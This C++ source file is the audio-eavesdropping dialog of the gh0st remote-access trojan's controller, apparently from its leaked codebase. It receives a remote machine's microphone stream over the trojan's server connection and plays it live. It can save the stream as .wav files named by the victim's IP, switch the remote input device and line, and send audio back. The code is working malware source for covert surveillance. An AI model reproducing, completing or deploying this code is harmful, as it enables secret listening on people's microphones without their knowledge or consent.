// AudioDlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "AudioDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif


/////////////////////////////////////////////////////////////////////////////
// CAudioDlg dialog

CAudioDlg::CAudioDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
: CDialog(CAudioDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CAudioDlg)
	m_bIsSendLocalAudio = FALSE;
	m_bCheckRec = FALSE;
	//}}AFX_DATA_INIT
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;

	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_AUDIO));

	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

	m_bIsWorking	= true;

	m_hWorkThread   = NULL;
	
	m_nTotalRecvBytes = 0;

    m_SelectedDevice = m_SelectedLines =0;
}


void CAudioDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAudioDlg)
	DDX_Control(pDX, IDC_COMBO_INPUTLINES, m_combo_input_lines);
	DDX_Control(pDX, IDC_COMBO_INPUTDRIVE, m_combo_input_drive);
	DDX_Control(pDX, IDC_STATIC_DATACURVE, m_datacurve);
	DDX_Check(pDX, IDC_SEND_LOCALAUDIO, m_bIsSendLocalAudio);
	DDX_Check(pDX, IDC_CHECK_REC, m_bCheckRec);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CAudioDlg, CDialog)
	//{{AFX_MSG_MAP(CAudioDlg)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_SEND_LOCALAUDIO, OnSendLocalaudio)
	ON_BN_CLICKED(IDC_CHECK_REC, OnCheckRec)
	ON_CBN_SELCHANGE(IDC_COMBO_INPUTDRIVE, OnSelchangeComboDriveIn)
	ON_CBN_SELCHANGE(IDC_COMBO_INPUTLINES, OnSelchangeComboInputlines)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CAudioDlg message handlers

struct WAVE_INFO
{
	char str[1024];//  
	int nIndex;    // 下标
};

BOOL CAudioDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	CString str;
	str.Format("\\\\%s - 语音监听", m_IPAddress);
	SetWindowText(str);

	WAVE_INFO Wave_Info;
	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	memcpy(&Wave_Info, lpBuffer , sizeof(WAVE_INFO));

	str.Format("%s",Wave_Info.str);

	CString strtemp;

	// '$'前为输入设备名  | 前为输入线路信息
	for(int i = 0; ; i++)
	{
		int nPos = str.Find('$');
		if (nPos == -1)
			break;
		
		strtemp = str.Mid(0,nPos);

		// 插入设备名
		m_combo_input_drive.InsertString(i,strtemp);
		// 截取剩余的字符串
		str = str.Right( str.GetLength() - nPos - 1);
		
		// 查找 输入线路信息
		nPos = str.Find('|');
		if (nPos == -1)
			continue;
		
		// 截取
		strtemp = str.Mid(0,nPos);
		str = str.Right(str.GetLength() - nPos - 1);

		// 添加到Combox
		ShowLinesCombox(strtemp,Wave_Info.nIndex);
	}
	
	m_combo_input_drive.SetCurSel(0);

	// 通知远程控制端对话框已经打开
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
	
	m_datacurve.SetHwnd(m_datacurve.GetSafeHwnd());

	m_hWorkThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CAudioDlg::ShowLinesCombox(CString str,int nSelect)
{
	CString strtemp;
	// 清空ComBox
	m_combo_input_lines.ResetContent();
	for(int i = 0; ; i++)
	{
		// 输入线路由 @ 区分
		int nPos = str.Find('@');
		if (nPos == -1)
			break;
		
		strtemp = str.Mid(0,nPos);
		str = str.Right( str.GetLength() - nPos - 1);

		// 插入数据
		m_combo_input_lines.InsertString(i,strtemp);
	}
	m_SelectedLines = nSelect;
	m_combo_input_lines.SetCurSel(nSelect);
}

void CAudioDlg::OnReceiveComplete()
{
	m_nTotalRecvBytes += m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;

	CString	str;
	str.Format("Receive %d KBytes", m_nTotalRecvBytes / 1024);
	SetDlgItemText(IDC_TIPS, str);

	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_AUDIO_DATA:
		{
			memset(m_cBufOut,0,SIZE_AUDIO_FRAME);
			int lOut = m_Audio.DeCompress((char *)m_pContext->m_DeCompressionBuffer.GetBuffer(1),m_cBufOut,m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
			m_Audio.playBuffer((unsigned char *)m_cBufOut, lOut);
			
			if (!csFileName.IsEmpty())// 正在录音
			{
				m_wavefile.WriteWavData((LPBYTE)m_cBufOut,lOut);
				m_wavefile.SeekToEnd();
			}
		}
		break;
	case TOKEN_AUDIO_CHANGE_FINISH:
		{
			WAVE_INFO Wave_Info;
			LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
			memcpy(&Wave_Info, lpBuffer , sizeof(WAVE_INFO));
	    	ShowLinesCombox(Wave_Info.str,Wave_Info.nIndex);
		}
		break;
	default:
		// 传输发生异常数据
		return;
	}
}

void CAudioDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	if (!csFileName.IsEmpty())// 正在录音
		m_wavefile.close();
	
	
	m_bIsWorking = false;
	WaitForSingleObject(m_hWorkThread, INFINITE);

	closesocket(m_pContext->m_Socket);

	CloseHandle(m_hWorkThread);
	CDialog::OnClose();
}

void CAudioDlg::OnSendLocalaudio() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
}

// 负责发送本地语音
DWORD WINAPI CAudioDlg::WorkThread(LPVOID lparam)
{
	CAudioDlg	*pThis = (CAudioDlg *)lparam;

	BYTE pData [1000];
	int n;
	while (pThis->m_bIsWorking)
	{
		for (int i = n = 0 ; i < 16 ; i ++)
		{
			if (pThis->m_hWnd == NULL)
				continue;

			memcpy(pData,pThis->m_cBufOut + n,1000);
			pThis->m_datacurve.SetSoundInBuffer(pData,1000,16);
			n+=1000;			
			pThis->m_datacurve.Invalidate(TRUE);
		   	Sleep(60);
			
		}
		
		if (!pThis->m_bIsSendLocalAudio)
			continue;
		
		DWORD	dwBytes = 0;
		LPBYTE	lpDate = pThis->m_Audio.getRecordBuffer(&dwBytes);

		memset(pThis->m_cBufln,0,SIZE_AUDIO_PACKED);
		int    lin = pThis->m_Audio.Compress((char*)lpDate,pThis->m_cBufln,dwBytes);

		LPBYTE	lpBuffer = new BYTE[lin+1];
		if (lpBuffer == NULL)
			continue;
		
		lpBuffer[0] = COMMAND_AUDIO_DATE;
		
		memcpy(lpBuffer + 1, pThis->m_cBufln, lin);
			
		if (lpBuffer != NULL && dwBytes > 0)
			pThis->m_iocpServer->Send(pThis->m_pContext, lpBuffer, lin+1);

		delete [] lpBuffer;
	}
	return 0;
}


void CAudioDlg::OnCheckRec() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	if (m_bCheckRec == FALSE)
	{
		SetDlgItemText(IDC_STATIC_LISTEN_SAVE, "Listening.....");
		
		csFileName = "";
		m_wavefile.close();
		return;
	}

	csFileName = "";
	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.wav"));
	CFileDialog dlg(FALSE, _T("wav"), strFileName, OFN_OVERWRITEPROMPT, _T("Voice(*.wav)|*.wav|"), this);
	if(dlg.DoModal () != IDOK)
	{
		((CButton *)GetDlgItem(IDC_CHECK_REC))->SetCheck(FALSE); 
		return;
	}
	SetDlgItemText(IDC_STATIC_LISTEN_SAVE, "Listening & Save.....");
	csFileName = dlg.GetPathName();

	// 创建一个wave文件
	m_wavefile.Open(csFileName,GENERIC_WRITE);
	m_wavefile.WriteWavFileHeader();
	m_wavefile.SeekToEnd();
}

void CAudioDlg::OnSelchangeComboDriveIn() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	int nIndex = m_combo_input_drive.GetCurSel();
	if (nIndex == m_SelectedDevice)
		return;
	else
	{
		m_SelectedDevice = nIndex;
		
		WAVE_INFO Wave_Info;
		ZeroMemory(&Wave_Info,sizeof(WAVE_INFO));

		m_combo_input_drive.GetLBText(nIndex,Wave_Info.str);
		Wave_Info.nIndex  = m_SelectedDevice;
		
		
		
		DWORD	dwBytesLength = 1 + sizeof(WAVE_INFO);
		LPBYTE	lpBuffer = new BYTE[dwBytesLength];
		if (lpBuffer == NULL)
			return;
		
		lpBuffer[0] = COMMAND_AUDIO_CHANGER;
		
		memcpy(lpBuffer + 1,&Wave_Info,sizeof(WAVE_INFO));
		m_iocpServer->Send(m_pContext, lpBuffer,dwBytesLength);		
		delete [] lpBuffer;	
		
	}
}

void CAudioDlg::OnSelchangeComboInputlines() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	int nIndex = m_combo_input_lines.GetCurSel();
	if (nIndex == m_SelectedLines)
		return;
	else
	{
		m_SelectedDevice = nIndex;
	

		WAVE_INFO Wave_Info;
		ZeroMemory(&Wave_Info,sizeof(WAVE_INFO));

		m_combo_input_drive.GetLBText(m_combo_input_drive.GetCurSel(),Wave_Info.str);
		Wave_Info.nIndex  = m_SelectedDevice;
		
		DWORD	dwBytesLength = 1 + sizeof(WAVE_INFO);
		LPBYTE	lpBuffer = new BYTE[dwBytesLength];
		if (lpBuffer == NULL)
			return;
		
		lpBuffer[0] = COMMAND_AUDIO_CHANGER_LINES;
		
		memcpy(lpBuffer + 1,&Wave_Info,sizeof(WAVE_INFO));
		m_iocpServer->Send(m_pContext, lpBuffer,dwBytesLength);		
		delete [] lpBuffer;	
	}
}

void CAudioDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	if (m_bIsWorking)
		OnClose();
	
	delete this;
	CDialog::PostNcDestroy();
}

